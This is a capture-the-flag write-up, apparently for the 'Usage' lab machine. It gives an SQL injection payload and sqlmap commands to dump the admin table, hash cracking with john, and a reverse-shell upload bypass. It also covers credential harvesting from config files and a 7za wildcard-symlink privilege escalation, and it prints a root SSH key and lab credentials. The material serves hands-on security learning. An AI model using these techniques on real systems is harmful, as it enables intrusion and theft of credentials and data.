## Reconnaissance
- Nmap enumeration :
	```bash
nmap 10.10.11.18
nmap -sV -sC -vv 10.10.11.18 #using this output unless other show otherwise
nmap -sU 10.10.11.18
nmap -sT -A --top-ports=60000 10.10.11.18 -oG top-port-sweep.txt 
```
	- Output:
		```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
	- Port 80 http
	- Running nginx
	- redirects to http://usage.htb
	- Linux OS and kernel (5.0)
- After editing /etc/hosts, we check website :
	- admin.usage.htb added as there is another link
	- we find the reset password link (http://usage.htb/forget-password) is injectable we passing:
		```bash
' or 1=1-- -
```
		- copy request in burp suite and pass sqlmap command on request
			```bash
sqlmap -r reset.req -p email --batch --risk=3 --level=5 --threads=10 # increase threads to increase speed, max 10
sqlmap -r reset.req -p email --batch --risk=3 --level=5 --dbs
sqlmap -r reset.req -p email --batch --risk=3 --level=5 -D usage_blog  --tables --threads=10
sqlmap -r reset.req -p email --batch --risk=3 --level=5 -D usage_blog -T admin_users --dump --threads=10
```
			- Output:
				```bash
[1 entry]
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | !      | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2025-03-27 16:25:04 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```
				- Name : Admnistrator
				- username : admin
				- password : $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
				- remember_token : kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT
		- Password is a hash.
			- Copy to file called hash
			- crack with john
				```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
				- Output:
					```bash
whatever1        (?)
```
					- can login as admin
- CVE-2023-24249 : shows PoC
	- upload php reverse shell saved as .php.jpg to the **admin profile picture**
	- capture packet submission on burpsuite and change the filename parameter to add.php again after the jpj
	- rightclick view file and open in new tab
		- should execute reverse shell if listening on netcat
		- user is dash
		- get user.txt
-  **NEW COMMAND** to get shell :
	```bash
script /dev/null -c bash
```
	 - find out why
## Initial Foothold Enumeration
- 
## Machine got reset so this all may have been added by some user
- i found linpeas. 
	```bash
chmod +x linpeas.sh
/linpeas.sh
```
## Initial foothold
- ps -ax reveals /usr/bin/monit
- can't do sudo -l
	- no pwd
- monit maybe a service
- file/usr/bin/monit is a service
	- cat doesn't show anything readable
- search for monit files
	```bash
find / -name monit.service 2>/dev/null
```
	- output :
		```bash
/usr/share/doc/monit/examples/monit.service
/etc/systemd/system/monit.service
/etc/systemd/system/multi-user.target.wants/monit.service
```
- reading /etc/systemd/syetm/monit.service
	- doesn't show much
- in our home directory on passing ls -al we find some hidden monit files.
	- on searching .monitrc
		```bash
cat .monitrc
---------------
OUTPUT:
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
		- username : admin
		- password : `3nc0d3d_pa$$w0rd`
		- xander access granted. can now ssh for better shell.
## Privilege escalation
- sudo -l reveals we can pass /usr/bin/usage_management
	- executable
- strings /usr/bin/usage_management
	```bash
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *  # what is 7za
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql # normal behoviour
```
	- 7za is 7zip
	- does a zip and creates a symlink (-snl) which is interesting for exploits
	- working directory has to be /var/www/html
	- (instead of hacktricks), google 7za snl vulnerability and found this which said the same :
		- https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks
	- on checking hacktricks we see it can be vulnerable. 
		- we see a privilege escalation
			```bash
In 7z even using -- before * (note that -- means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
And you can create files in the folder were this is being executed, you could create the file @root.txt and the file root.txt being a symlink to the file you want to read:

bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
Then, when 7z is execute, it will treat root.txt as a file containing the list of files it should compress (thats what the existence of @root.txt indicates) and when it 7z read root.txt it will read /file/you/want/to/read and as the content of this file isn't a list of files, it will throw and error showing the content.
```
		- we execute this to get root ssh key (we see id_rsa and id_rsa_root at home folder)
- goto /var/www/html and create file @id_rsa
	- as we are running as root it should pass on the details to us
		- we create @id_rsa file and create link to id_rsa at root
		- we pass the usage_management command
			```bash
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
sudo /usr/bin/usage_management
>1
```
			- Output (sanitized):
				```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8MiQgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDsH2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```
	- we store ssh key in our local machine **and change permissions to 600**
		```bash
chmod 0600 id_rsa
ssh -i id_rsa root@usage.htb
```
		- we gain root shell

------------
# Rabbit Holes
## Priv Escalation Enumeration
- Commands that led to nowhere:
	```bash
find / -type f -perm -4000 2>/dev/null
ss -tlpn
cat /etc/apache2/..
cat /var/www/hmtl/... # although the location /var/www/html was important it's contents didn't provide priv escalation value. Also don't think I could access most of the files here as normal user.
```


- Linpeas enumeration :
	- pwd outputs:
		```bash
-rwxrwxr-x 1 xander xander 1176 Aug 23  2023 /home/xander/project_admin/.env                           
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:oMsNNEsunFZxVvNVc0pfq7Gbn8hWGURpQLAgH6/dktA=
APP_DEBUG=false
APP_URL=http://admin.usage.htb
LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3d_1uth
BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120
```
		- password: s3cr3t_c0d3d_1uth
		- leads to password for mysql user staff which we can login but we cant use SELECT command as staff

-------
## Burp Suite Token?
- found this token that as generated when resetting password so thought maybe the token was of ana uthenticated user. was an xsrf and laravel token. saw laravel was for file upload so thought an exploit lied there post authentication maybe.
	```bash
XSRF Token:

eyJpdiI6InF1UHk5dWpoRnJMSldhajAzb0s3YVE9PSIsInZhbHVlIjoiS3QrQ0dRUXZGVFZYS0t2YzRNOXNFRHBNWW1LUmJ2REIzNWJKelp4bURNemIycUt4M0Z6S3g5MU13Y3crK1JsalBuRTMxOEQ4cDAvV3NObGVXWG1rb2cxYTh2VFpyZkxCOXRIR0VRNHByTy9IZ3FHb2E0Q1dPRVpsYitWZTVTSXMiLCJtYWMiOiIzNTVlMTMzZmRlMzUwNjVmZGNjZmQyNjY3ODllYjc5MDFjMmIyNzg5Y2EzMzM4MGQwOTYwMWMxNTliNjRkNmM2IiwidGFnIjoiIn0%3D
--------
Laravel Token:
eyJpdiI6IlVmbUIwYWFCakhCempDUDI4NHdNR3c9PSIsInZhbHVlIjoiaGxUb21lbW5qSXB6N0xKckx0STFWOHdzQmk1ZDU4ZmFHQ1BINVhuNUdzMWx2MXU2SGxUV3kwK3pXK0ZWMGFtbUd1SDlKblNnZUlQRjVaMFJ6cEVycVh5Z25VN09UVDNibE93V0ViYVprT0N0S21ldnAzeG5nck9BZ295Zm1kcVgiLCJtYWMiOiJiYzM4NDk0ZWM1ZmU5ZGM5NzcwMWY2MjZhMGZjMjViNWY0MDFjYjRmZGExMTY1YmE0ZmRhYTY1OTRlMGMwMDk5IiwidGFnIjoiIn0%3D
--------
```
--------
## 